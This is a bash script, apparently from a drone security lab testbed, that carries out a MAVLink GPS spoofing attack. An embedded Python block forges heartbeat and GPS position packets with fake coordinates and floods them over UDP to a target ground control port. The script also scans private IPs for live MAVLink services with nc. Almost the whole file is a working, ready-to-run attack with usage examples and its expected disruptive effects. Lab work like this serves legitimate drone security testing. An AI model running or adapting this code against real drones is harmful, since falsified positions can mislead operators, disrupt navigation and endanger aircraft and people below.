#!/bin/bash
# gps_spoofing.sh - 드론 GPS 스푸핑 공격 모듈
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/protocol_tampering/gps_spoofing.sh
# Purpose: 드론 GPS 위치 정보 스푸핑을 통한 위치 조작

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="GPS Spoofing Attack"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}         GPS Spoofing Attack               ${NC}"
    echo -e "${CYAN}============================================${NC}"
}

execute_gps_spoofing() {
    local target_ip=${1:-"127.0.0.1"}
    local target_port=${2:-"14550"}
    local duration=${3:-30}
    
    log_info "Starting GPS spoofing attack"
    log_info "Target: ${target_ip}:${target_port}"
    log_info "Duration: ${duration} seconds"
    
    # Python 스크립트 생성 및 실행
    create_and_run_attack "$target_ip" "$target_port" "$duration"
    local result=$?
    
    if [ $result -eq 0 ]; then
        log_success "GPS spoofing attack completed successfully"
        return 0
    else
        log_error "GPS spoofing attack failed"
        return 1
    fi
}

create_and_run_attack() {
    local target_ip="$1"
    local target_port="$2"
    local duration="$3"
    
    log_info "Creating and executing GPS spoofing attack..."
    
    python3 << PYEOF
from pymavlink import mavutil
from scapy.all import *
import time

target_ip = "$target_ip"
target_port = int("$target_port")
duration = int("$duration")

def create_heartbeat():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
    ).pack(mav)

def create_gps_raw_int():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.gps_raw_int_encode(
        time_usec=int(time.time() * 1e6),
        fix_type=3,
        lat=473566100,  # Fake coordinates (47.3566100, 85.4619300)
        lon=854619300,
        alt=1500,
        eph=100,
        epv=100,
        vel=500,
        cog=0,
        satellites_visible=10
    ).pack(mav)

def create_global_position_int():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.global_position_int_encode(
        time_boot_ms=int(time.time() * 1e3) % 4294967295,
        lat=473566100,
        lon=854619300,
        alt=1500000,
        relative_alt=1500000,
        vx=0,
        vy=0,
        vz=0,
        hdg=0
    ).pack(mav)

def send_packet(packet_data):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet, verbose=False)

print(f"Starting GPS spoofing to {target_ip}:{target_port} for {duration}s")
print("Spoofing coordinates: 47.3566100, 85.4619300 (1500m altitude)")

start_time = time.time()
packets_sent = 0

while time.time() - start_time < duration:
    send_packet(create_heartbeat())
    send_packet(create_gps_raw_int())
    send_packet(create_global_position_int())
    packets_sent += 3
    
    if packets_sent % 15 == 0:
        print(f"Sent {packets_sent} spoofed GPS packets")
    
    time.sleep(1)

print(f"Attack completed. Total packets sent: {packets_sent}")
PYEOF
    
    return $?
}

# 타겟 스캔
scan_targets() {
    log_info "Scanning for MAVLink targets..."
    
    local targets=(
        "127.0.0.1:14550"
        "10.13.0.6:14550"
        "192.168.13.14:14550"
        "10.13.0.4:14550"
    )
    
    for target in "${targets[@]}"; do
        local ip=$(echo "$target" | cut -d':' -f1)
        local port=$(echo "$target" | cut -d':' -f2)
        
        if timeout 2 nc -z "$ip" "$port" 2>/dev/null; then
            echo -e "${GREEN}Found MAVLink service: $target${NC}"
            return 0
        fi
    done
    
    echo -e "${YELLOW}No live targets found, using default${NC}"
    return 1
}

# 메인 실행 함수
main() {
    print_attack_banner
    
    if [ "$EUID" -ne 0 ]; then
        log_error "This script must be run as root"
        exit 1
    fi
    
    # 필수 도구 확인
    local required_tools=("python3")
    local missing_tools=()
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        log_error "Missing required tools: ${missing_tools[*]}"
        exit 1
    fi
    
    # Python 의존성 확인
    if ! python3 -c "import pymavlink, scapy" 2>/dev/null; then
        log_info "Installing Python dependencies..."
        pip3 install pymavlink scapy >/dev/null 2>&1
    fi
    
    # 사용자 옵션 처리
    local target_ip="${1:-127.0.0.1}"
    local target_port="${2:-14550}"
    local duration="${3:-30}"
    
    # 사용법 출력
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
        echo "Usage: $0 [target_ip] [target_port] [duration]"
        echo "  target_ip   : Target IP address (default: 127.0.0.1)"
        echo "  target_port : Target port (default: 14550)"
        echo "  duration    : Attack duration in seconds (default: 30)"
        echo ""
        echo "Examples:"
        echo "  $0                           # Attack localhost with defaults"
        echo "  $0 10.13.0.6                # Attack specific IP"
        echo "  $0 10.13.0.6 14550 60       # Full parameters"
        echo ""
        echo "Expected Effects:"
        echo "  • GCS shows fake GPS coordinates (47.3566100, 85.4619300)"
        echo "  • Drone appears at wrong location on map"
        echo "  • Navigation systems may be confused"
        echo "  • Mission planning disrupted"
        exit 0
    fi
    
    # 타겟 스캔 (정보용)
    scan_targets
    
    # 공격 실행
    execute_gps_spoofing "$target_ip" "$target_port" "$duration"
    exit $?
}

# 직접 실행 시 메인 함수 호출
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi